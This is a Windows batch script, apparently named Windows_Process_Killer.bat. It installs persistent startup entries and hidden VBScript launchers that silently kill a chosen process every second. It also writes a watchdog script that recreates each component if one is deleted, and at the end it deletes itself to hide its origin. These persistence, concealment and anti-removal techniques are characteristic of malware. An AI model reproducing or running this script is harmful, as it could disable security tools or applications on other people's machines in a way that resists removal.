@ECHO OFF
:: Variables
:: Here you can change to any process you want to stop
SET PROCESS=
SET PATHA="%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\A.bat"
SET PATHC="C:\Users\Public\Documents\Network\C.bat"
SET PATHG="C:\Users\Public\Documents\Network\G.vbs"
SET PATHZ="%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Z.bat"
SET PATHBU="%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\BU.bat"
SET PATHGB="%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\GB.vbs"

:: Creating Directory
md C:\Users\Public\Documents\Network

:: Part A
:: Variables
ECHO wscript.exe %PATHG% %PATHC% >> %PATHA%

:: Part C
ECHO @ECHO OFF > %PATHC%
echo :SEARCH >> %PATHC%
echo TIMEOUT /T 1 ^>nul >> %PATHC%
echo tasklist /nh /fi "imagename eq %PROCESS%" ^| find /i "%PROCESS%" ^>nul ^&^& ( >> %PATHC%
echo taskkill /IM %PROCESS% ^& GOTO SEARCH >> %PATHC%
echo ) ^|^| ( >> %PATHC%
echo GOTO SEARCH ^>nul >> %PATHC%
echo ) >> %PATHC%
echo pause^>nul >> %PATHC%

:: Part G
ECHO CreateObject("Wscript.Shell").Run """" ^& WScript.Arguments(0) ^& """", 0, False > %PATHG%

:: Part GB
ECHO CreateObject("Wscript.Shell").Run """" ^& WScript.Arguments(0) ^& """", 0, False > %PATHGB%


:: Part BU
ECHO wscript.exe %PATHGB% %PATHZ% >> %PATHBU%

:: Part Z
ECHO :Z > %PATHZ%
ECHO TIMEOUT /T 10 >> %PATHZ%
:: Parte Z
ECHO IF NOT EXIST %PATHGB%. ( >> %PATHZ%
ECHO GOTO CREATION >> %PATHZ%
ECHO ) >> %PATHZ%
ECHO IF NOT EXIST %PATHC%. ( >> %PATHZ%
ECHO GOTO CREATION >> %PATHZ%
ECHO ) >> %PATHZ%
ECHO IF NOT EXIST %PATHG%. ( >> %PATHZ%
ECHO GOTO CREATION >> %PATHZ%
ECHO ) >> %PATHZ%
ECHO IF NOT EXIST %PATHA%. ( >> %PATHZ%
ECHO GOTO CREATION >> %PATHZ%
ECHO ) >> %PATHZ%
ECHO IF NOT EXIST %PATHBU%. ( >> %PATHZ%
ECHO GOTO CREATION >> %PATHZ%
ECHO ) >> %PATHZ%
ECHO GOTO Z >> %PATHZ%
:: Creation
ECHO : CREATION >> %PATHZ%
:: Backup Directory
ECHO md C:\Users\Public\Documents\Network >> %PATHZ%

:: Backup A
ECHO ECHO @ECHO OFF ^> %PATHA% >> %PATHZ%
ECHO ECHO wscript %PATHG% %PATHC% ^>^> %PATHA% >> %PATHZ%

:: Backup BU
ECHO ECHO wscript %PATHGB% %PATHZ% ^> %PATHBU% >> %PATHZ%

:: Backup C
ECHO @ECHO OFF ^> %PATHC% >> %PATHZ%
ECHO ECHO :SEARCH ^>^> %PATHC% >> %PATHZ%
ECHO ECHO TIMEOUT /T 1 ^^^>nul ^>^> %PATHC% >> %PATHZ%
ECHO ECHO tasklist /nh /fi "imagename eq %PROCESS%" ^^^| find /i "%PROCESS%" ^^^>nul ^^^&^^^& ( ^>^> %PATHC% >> %PATHZ%
ECHO ECHO taskkill /IM %PROCESS% ^^^& GOTO SEARCH ^>^> %PATHC% >> %PATHZ%
ECHO ECHO ) ^^^|^^^| ( ^>^> %PATHC% >> %PATHZ%
ECHO ECHO GOTO SEARCH ^^^>nul ^>^> %PATHC% >> %PATHZ%
ECHO ECHO ) ^>^> %PATHC% >> %PATHZ%
ECHO ECHO pause^^^>nul ^>^> %PATHC% >> %PATHZ%

:: Backup G
ECHO ECHO CreateObject("Wscript.Shell").Run """" ^^^& WScript.Arguments(0) ^^^& """", 0, False ^> %PATHG% >> %PATHZ%

:: Backup GB
ECHO ECHO CreateObject("Wscript.Shell").Run """" ^^^& WScript.Arguments(0) ^^^& """", 0, False ^> %PATHGB% >> %PATHZ%

:: Looping
ECHO GOTO Z  >> %PATHZ%
ECHO GOTO Z  >> %PATHZ%

:: Deleting
DEL .\Windows_Process_Killer.bat